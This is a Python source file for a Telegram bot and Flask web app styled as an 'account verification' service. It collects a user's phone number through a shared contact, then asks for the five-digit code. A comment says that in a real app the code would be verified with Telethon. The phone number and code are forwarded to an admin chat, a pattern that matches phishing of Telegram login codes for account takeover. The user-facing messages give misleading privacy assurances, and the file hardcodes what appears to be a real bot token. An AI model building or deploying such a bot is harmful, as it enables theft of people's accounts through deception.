import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time
import json

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__)

# Configuration - USE YOUR ACTUAL TOKEN
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage (in production, use a database)
user_sessions = {}
session_timeout = 600  # 10 minutes

# ==================== HELPER FUNCTIONS ====================
def create_user_session(user_id, telegram_user=None):
    """Create a new user session"""
    user_sessions[user_id] = {
        'user_id': user_id,
        'created': datetime.now(),
        'status': 'waiting',
        'phone': None,
        'telegram_user': telegram_user,
        'otp_sent': False,
        'otp_verified': False,
        'last_activity': datetime.now()
    }
    logger.info(f"✅ Created session for user {user_id}")
    return user_sessions[user_id]

def get_user_session(user_id):
    """Get user session if valid"""
    if user_id in user_sessions:
        session = user_sessions[user_id]
        # Update last activity
        session['last_activity'] = datetime.now()
        
        # Check if session expired
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            logger.info(f"🗑️ Session expired for user {user_id}")
            del user_sessions[user_id]
            return None
        return session
    return None

def get_or_create_session(user_id, telegram_user=None):
    """Get existing session or create new one"""
    session = get_user_session(user_id)
    if not session:
        session = create_user_session(user_id, telegram_user)
    return session

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page - gets user from Telegram WebApp"""
    try:
        # Check for initData from Telegram WebApp
        init_data = request.args.get('tgWebAppData', '')
        user_id = None
        telegram_user = None
        
        if init_data:
            try:
                # Parse initData (simplified - in production validate with bot token)
                # Format: query_id=...&user=%7B%22id%22%3A...%7D&...
                import urllib.parse
                
                # Decode URL-encoded data
                decoded_data = urllib.parse.unquote(init_data)
                
                # Parse parameters
                params = {}
                for param in decoded_data.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Extract user JSON
                if 'user' in params:
                    user_json = params['user']
                    user_obj = json.loads(user_json)
                    user_id = str(user_obj.get('id'))
                    telegram_user = user_obj
                    logger.info(f"🌐 WebApp accessed by user {user_id} via Telegram WebApp")
            except Exception as e:
                logger.error(f"Error parsing initData: {e}")
        
        # Fallback to URL parameter
        if not user_id:
            user_id = request.args.get('user_id')
            if user_id:
                logger.info(f"🌐 WebApp accessed with URL user_id: {user_id}")
        
        if user_id:
            # Create or get existing session
            session = get_or_create_session(user_id, telegram_user)
            
            # Update Telegram user info if available
            if telegram_user and session:
                session['telegram_user'] = telegram_user
            
            # Check if OTP already sent
            if session.get('otp_sent') and session.get('phone'):
                return render_template('otp.html', 
                                     user_id=user_id, 
                                     phone=session['phone'],
                                     bot_username=BOT_USERNAME)
        
        # Render main page
        return render_template('index.html',
                             user_id=user_id if user_id else '',
                             bot_username=BOT_USERNAME,
                             webapp_url=WEBAPP_URL)
                             
    except Exception as e:
        logger.error(f"Error in index route: {e}")
        return render_template('index.html',
                             user_id='',
                             bot_username=BOT_USERNAME,
                             webapp_url=WEBAPP_URL)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return render_template('error.html',
                             error="User ID not found",
                             message="Please open from Telegram bot.",
                             bot_username=BOT_USERNAME)
    
    session = get_user_session(user_id)
    if not session:
        return render_template('error.html',
                             error="Session expired",
                             message="Please start over from bot.",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    return render_template('otp.html',
                         user_id=user_id,
                         phone=phone,
                         bot_username=BOT_USERNAME)

@app.route('/api/session-status/<user_id>', methods=['GET'])
def session_status(user_id):
    """Check session status"""
    session = get_user_session(user_id)
    if session:
        return jsonify({
            'success': True,
            'user_id': user_id,
            'status': session['status'],
            'phone': session.get('phone'),
            'otp_sent': session.get('otp_sent', False),
            'otp_verified': session.get('otp_verified', False)
        })
    return jsonify({'success': False, 'error': 'Session not found'})

@app.route('/api/start-verification', methods=['POST'])
def start_verification():
    """Start verification process"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        session = get_user_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session not found'})
        
        # Update session status
        session['status'] = 'verification_started'
        session['verification_started_at'] = datetime.now()
        
        return jsonify({
            'success': True,
            'message': 'Verification started',
            'instructions': f"""To complete verification:

1. 📱 Go back to Telegram chat with @{BOT_USERNAME}
2. 📎 Tap the attachment button
3. 👤 Select "Contact"
4. ✅ Choose your contact
5. 🚀 Send it to the bot

✅ Your contact will be auto-deleted immediately
✅ OTP will be sent automatically
✅ Come back here after sending"""
        })
        
    except Exception as e:
        logger.error(f"Error starting verification: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        if not otp or len(otp) != 5:
            return jsonify({'success': False, 'error': 'Invalid OTP format'})
        
        session = get_user_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # In a real app, verify OTP with Telethon
        # For now, simulate successful verification
        session['otp_verified'] = True
        session['status'] = 'verified'
        session['verified_at'] = datetime.now()
        
        # Send notification to admin
        try:
            phone = session.get('phone', 'Unknown')
            admin_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

🆔 User ID: {user_id}
📱 Phone: {phone}
🔢 OTP: {otp}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp"""
            
            bot.send_message(int(os.environ.get("ADMIN_ID", user_id)), admin_msg, parse_mode='HTML')
        except:
            pass
        
        return jsonify({
            'success': True,
            'message': 'OTP verified successfully!'
        })
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command - FIXED VERSION"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start received from {user_id} (@{username})")
        
        # Create Telegram user object
        telegram_user = {
            'id': user_id,
            'first_name': first_name,
            'username': username
        }
        
        # Create or get user session
        session = get_or_create_session(user_id, telegram_user)
        
        # Create WebApp URL with user_id
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>How it works:</b>
1. Open WebApp
2. Follow instructions to share contact
3. Receive OTP on your phone
4. Enter OTP in WebApp
5. Verification complete! ✅

⚠️ <b>Important:</b> Your contact will be auto-deleted immediately for privacy.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        # Send message with WebApp button
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ WebApp button sent to {user_id}")
        
        # Send admin notification
        try:
            admin_id = os.environ.get("ADMIN_ID")
            if admin_id:
                admin_msg = f"""👤 <b>NEW USER STARTED</b>

🆔 User ID: <code>{user_id}</code>
👤 Name: {first_name}
🔗 Username: @{username}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 WebApp: {webapp_url}"""
                
                bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Admin notification error: {e}")
        
    except Exception as e:
        logger.error(f"❌ Error in /start handler: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle shared contact - FIXED VERSION"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        
        # Check if message has contact
        if not message.contact:
            bot.send_message(chat_id, "⚠️ Please share a valid contact.")
            return
        
        contact = message.contact
        phone = contact.phone_number
        first_name = contact.first_name or ""
        last_name = contact.last_name or ""
        
        logger.info(f"📞 Contact received from {user_id}: {phone}")
        
        # Get or create session
        session = get_or_create_session(user_id)
        
        # Update session with contact info
        session['phone'] = phone
        session['contact_name'] = f"{first_name} {last_name}".strip()
        session['contact_received_at'] = datetime.now()
        session['status'] = 'contact_received'
        
        # Delete contact message for privacy
        try:
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"🗑️ Deleted contact message for {user_id}")
        except Exception as e:
            logger.warning(f"Could not delete message: {e}")
        
        # Send processing message
        processing_msg = bot.send_message(
            chat_id,
            f"✅ Contact received! Phone: {phone}\n\nProcessing...",
            reply_markup=types.ReplyKeyboardRemove()
        )
        
        # Update session with OTP info
        session['otp_sent'] = True
        session['otp_sent_at'] = datetime.now()
        session['status'] = 'otp_sent'
        
        # Generate a dummy OTP for testing
        import random
        dummy_otp = str(random.randint(10000, 99999))
        session['otp_code'] = dummy_otp
        
        # Update message with WebApp link
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/otp?user_id={user_id}"
        
        # Edit the processing message
        try:
            bot.edit_message_text(
                f"""✅ <b>OTP Sent Successfully!</b>

📱 Phone: {phone}
👤 Name: {first_name} {last_name}

📨 <b>OTP has been sent to your phone</b>

🔢 <b>Test OTP:</b> {dummy_otp}

Click here to enter OTP:
{webapp_url}

Or open the WebApp again to continue.""",
                chat_id,
                processing_msg.message_id,
                parse_mode='HTML'
            )
        except:
            # If editing fails, send new message
            bot.send_message(
                chat_id,
                f"""✅ OTP Sent Successfully!

📱 Phone: {phone}
👤 Name: {first_name} {last_name}

📨 OTP has been sent to your phone

🔢 Test OTP: {dummy_otp}

Click here to enter OTP:
{webapp_url}""",
                parse_mode='HTML'
            )
        
        # Send admin notification
        try:
            admin_id = os.environ.get("ADMIN_ID")
            if admin_id:
                admin_msg = f"""📞 <b>CONTACT RECEIVED</b>

🆔 User ID: <code>{user_id}</code>
📱 Phone: {phone}
👤 Name: {first_name} {last_name}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
📨 OTP: Sent ({dummy_otp} for testing)
🌐 WebApp: {webapp_url}"""
                
                bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Admin notification failed: {e}")
        
        logger.info(f"✅ OTP process completed for {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Error handling contact: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        user_id = str(message.from_user.id)
        text = message.text or ""
        
        # Ignore commands
        if text.startswith('/'):
            return
        
        logger.info(f"💬 Message from {user_id}: {text[:50]}...")
        
        # Check if user has an active session
        session = get_user_session(user_id)
        if session and session.get('otp_sent'):
            # User is in verification process
            webapp_url = f"{WEBAPP_URL.rstrip('/')}/otp?user_id={user_id}"
            response = f"""🔐 <b>Verification in Progress</b>

You're currently verifying your account.

Click here to enter OTP:
{webapp_url}

Or send /start to restart."""
        else:
            # General help
            response = f"""<b>📋 Available Commands:</b>

/start - Open verification WebApp
/help - Show this help message

<b>How to verify:</b>
1. Send /start to get WebApp link
2. Open WebApp and follow instructions
3. Share your contact when prompted
4. Enter OTP in WebApp

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(message.chat.id, response, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_users = []
            
            for user_id, session in user_sessions.items():
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_sessions[user_id]
            
            if expired_users:
                logger.info(f"🧹 Cleaned up {len(expired_users)} expired sessions")
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            logger.error(f"Error in cleanup thread: {e}")
            time.sleep(60)

# ==================== BOT POLLING FUNCTION ====================
def bot_polling():
    """Robust bot polling with error recovery"""
    logger.info("🤖 Starting bot polling thread...")
    
    while True:
        try:
            logger.info("🔄 Bot polling started/renewed")
            bot.infinity_polling(
                timeout=60,
                long_polling_timeout=60,
                logger_level=logging.INFO
            )
        except telebot.apihelper.ApiTelegramException as e:
            if "Conflict" in str(e):
                logger.error("❌ Another instance is running. Stopping...")
                break
            else:
                logger.error(f"❌ Telegram API error: {e}")
                time.sleep(5)
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)
        else:
            # Clean exit
            break

# ==================== MAIN ====================
if __name__ == '__main__':
    # Print startup info
    logger.info("="*50)
    logger.info("🚀 Telegram WebApp Verification Bot - FIXED VERSION")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
    logger.info("="*50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling thread started")
    
    # Run Flask app
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting Flask on port {port}")
    
    # Simple Flask run for production
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    
    app.run(
        host='0.0.0.0', 
        port=port, 
        debug=False, 
        use_reloader=False,
        threaded=True
        )
